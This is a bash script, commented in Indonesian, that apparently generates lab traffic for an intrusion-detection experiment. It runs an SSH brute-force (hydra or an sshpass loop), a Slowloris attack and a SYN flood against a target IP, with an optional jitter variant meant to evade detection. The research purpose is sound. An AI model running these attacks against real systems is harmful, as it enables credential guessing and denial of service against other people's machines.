#!/bin/bash
# ============================================================
# T10 UNSW-NB15 — Skenario serangan (Fase 2: DETEKSI) dari Attacker.
# Pola NIDS-01 (~7 menit): benign -> SSH brute -> Slowloris -> SYN flood -> benign.
# Varian: clean (default) atau evasion (perturbasi level-paket).
# ============================================================
# Usage (di Attacker):
#   ./attack_scenario.sh <TARGET_PRIVATE_IP> [clean|evasion]
set -x
TARGET=$1
VARIANT=${2:-clean}
[ -z "$TARGET" ] && { echo "Usage: $0 <TARGET_IP> [clean|evasion]"; exit 1; }
IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -1)

if [ "$VARIANT" = "evasion" ]; then
  echo "[EVASION] aktifkan jitter (ubah IAT) via tc netem"
  sudo tc qdisc add dev "$IFACE" root netem delay 10ms 5ms || true
fi

echo "[$(date +%T)] Fase 0: benign warm-up (60s)"
for i in $(seq 1 60); do curl -s "http://$TARGET/" >/dev/null; sleep 1; done

echo "[$(date +%T)] Fase 1: SSH brute-force (120s)"
# hydra bila tersedia; jika tidak, loop ssh gagal sbg proxy brute-force
if command -v hydra >/dev/null; then
  timeout 120 hydra -l testuser -P /opt/passwords.txt -t 4 "$TARGET" ssh 2>&1 | tail -2
else
  timeout 120 bash -c "while true; do sshpass -p wrong ssh -o StrictHostKeyChecking=no testuser@$TARGET true 2>/dev/null; done" || true
fi

echo "[$(date +%T)] Fase 2: Slowloris (120s)"
timeout 120 slowloris "$TARGET" -p 80 -s 100 2>&1 | tail -2 || true

echo "[$(date +%T)] Fase 3: SYN flood (60s, rate 200/s)"
sudo timeout 60 nping --tcp --flags SYN --rate 200 -p 80 -c 12000 "$TARGET" 2>&1 | tail -3 || true

echo "[$(date +%T)] Fase 4: benign cool-down (60s)"
for i in $(seq 1 60); do curl -s "http://$TARGET/" >/dev/null; sleep 1; done

if [ "$VARIANT" = "evasion" ]; then
  sudo tc qdisc del dev "$IFACE" root netem || true
fi
echo "[$(date +%T)] SELESAI ($VARIANT). Stop capture di Target, lalu proses di Analyzer."
